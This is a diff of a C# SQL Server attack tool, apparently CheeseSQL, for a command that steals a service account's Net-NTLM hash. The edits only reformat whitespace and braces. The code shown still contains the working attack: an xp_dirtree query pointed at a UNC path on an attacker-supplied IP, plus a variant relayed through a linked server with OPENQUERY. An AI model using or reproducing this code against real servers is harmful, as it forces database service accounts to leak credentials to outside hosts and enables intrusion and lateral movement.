@@ -11,12 +11,12 @@ namespace CheeseSQL.Commands
         public string Description()
         {
             return $"[*] {CommandName}\r\n" +
-    $"  Description: Retrieve Net-NTLM Hash for Service Account from a directly accessible DB or Linked SQL Server";
+                   $"  Description: Retrieve Net-NTLM Hash for Service Account from a directly accessible DB or Linked SQL Server";
         }
 
         public string Usage()
         {
-            return $"{Description()}\r\n  " + 
+            return $"{Description()}\r\n  " +
                 $"Usage: {System.Reflection.Assembly.GetExecutingAssembly().GetName().Name} {CommandName} /db:DATABASE /server:SERVER /ip:ATTACKERIP /target:SERVER [/sqlauth /user:SQLUSER /password:SQLPASSWORD]";
         }
 
@@ -110,7 +110,8 @@ namespace CheeseSQL.Commands
             }
 
             string queryUNC = $"EXEC master..xp_dirtree \"\\\\{ip}\\\\test\";";
-            if (!String.IsNullOrEmpty(target)) {
+            if (!String.IsNullOrEmpty(target))
+            {
                 queryUNC = $"SELECT 1 FROM OPENQUERY(\"{target}\", 'SELECT 1; EXEC master..xp_dirtree \"\\\\{ip}\\\\test\";');";
             }
             SqlCommand command = new SqlCommand(queryUNC, connection);
